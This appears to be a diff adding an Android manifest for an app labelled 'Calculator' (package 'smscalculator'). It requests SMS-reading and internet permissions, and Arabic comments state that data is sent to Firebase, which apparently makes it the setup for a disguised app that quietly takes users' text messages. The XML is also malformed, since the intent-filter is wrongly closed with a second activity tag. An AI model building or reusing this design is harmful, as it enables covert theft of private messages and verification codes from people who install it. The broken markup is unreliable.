@@ -1,0 +1,21 @@
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.example.smscalculator">
+
+    <!-- صلاحية الإنترنت لإرسال البيانات لـ Firebase -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <!-- صلاحية قراءة الرسائل القصيرة -->
+    <uses-permission android:name="android.permission.READ_SMS" />
+
+    <application
+        android:label="Calculator" 
+        android:icon="@drawable/ic_launcher">
+        
+        <activity android:name=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </activity>
+        </activity>
+    </application>
+</manifest>
